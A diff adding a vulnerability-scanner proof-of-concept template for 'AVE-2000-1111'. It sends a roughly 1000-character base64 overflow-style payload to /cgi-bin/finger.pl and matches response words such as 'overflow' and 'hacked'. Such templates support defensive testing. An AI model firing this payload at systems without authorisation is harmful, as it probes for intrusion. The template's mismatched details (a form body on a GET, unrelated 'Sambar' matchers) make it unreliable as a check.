@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "AVE-2000-1111 verification"
+id = "POC-AVE-2000-1111"
+name = "PoC for AVE-2000-1111"
+severity = "high"
+tags = ["ave-2000-1111"]
+vuln_id = ["AVE-2000-1111"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/finger.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "hostname={{base64_encode(AAAAAA_1000_chars)}}&submit=Submit"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Content-type: text/plain",
+    "From:",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "hacked",
+    "command",
+    "overflow",
+    "Sambar",
+]
